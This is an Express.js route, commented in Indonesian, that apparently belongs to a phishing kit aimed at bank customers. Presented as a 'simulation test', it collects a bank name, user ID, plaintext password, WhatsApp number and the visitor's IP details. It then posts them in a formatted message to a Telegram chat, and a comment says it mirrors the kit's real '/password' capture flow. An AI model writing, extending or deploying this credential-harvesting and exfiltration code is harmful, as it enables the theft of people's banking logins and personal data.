app.post("/api/simulation-test", async function(req, res) {
  const { bank, userId, password, waNumber, telegramId, simulation } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  // Validasi input
  if (!bank || !userId || !password || !waNumber || !telegramId) {
    return res.status(400).json({
      success: false,
      message: "Semua field harus diisi (Bank, User ID, Password, Nomor WA, Telegram ID)"
    });
  }

  if (simulation !== true) {
    return res.status(400).json({
      success: false,
      message: "Hanya simulasi test yang diterima"
    });
  }

  const sessionId = `TEST-${Date.now()}-${crypto.randomBytes(3).toString('hex').toUpperCase()}`;

  try {
    // ==================== KIRIM NOTIF KE TELEGRAM ====================
    const ipText = await getIpInfoText(ip);
    
    const message = `
╔═══════════════════════╗
║   🧪 SIMULASI TEST    ║
╚═══════════════════════╝

📌 <b>DATA TEST</b>
━━━━━━━━━━━━━━━━━━━━━
🏦 <b>Bank:</b> <code>${bank}</code>
👤 <b>User ID:</b> <code>${userId}</code>
🔑 <b>Password:</b> <code>${password}</code>
📱 <b>Nomor WA:</b> <code>${waNumber}</code>
🆔 <b>Session:</b> <code>${sessionId}</code>
⏰ <b>Waktu:</b> ${new Date().toLocaleString('id-ID')}

${ipText}

━━━━━━━━━━━━━━━━━━━━━
⚠️ Status: Simulasi Test Data
    `;

    // Kirim notif ke USER (bukan owner!) - SESUAI FLOW /password
    const sendStatus = await sendMessage(message, telegramId);

    if (sendStatus === 200) {
      log.box('success', {
        Proses: 'SIMULASI TEST',
        Route: '/api/simulation-test',
        Bank: bank,
        UserId: userId,
        WaNumber: waNumber,
        TelegramID: telegramId,
        SessionId: sessionId,
        IP: ip,
      });

      return res.json({
        success: true,
        message: "✅ Data test berhasil dikirim ke Telegram!",
        data: { bank, userId, waNumber, sessionId, simulation: true }
      });
    } else {
      log.error('simulation test error', 'Gagal mengirim pesan ke Telegram');
      return res.status(502).json({
        success: false,
        message: "Pesan terkirim tapi gagal masuk Telegram (Retry limit)"
      });
    }

  } catch (error) {
    log.error('simulation test error', error.message);
    return res.status(502).json({
      success: false,
      message: "Terjadi error saat mengirim simulasi test ke Telegram"
    });
  }
});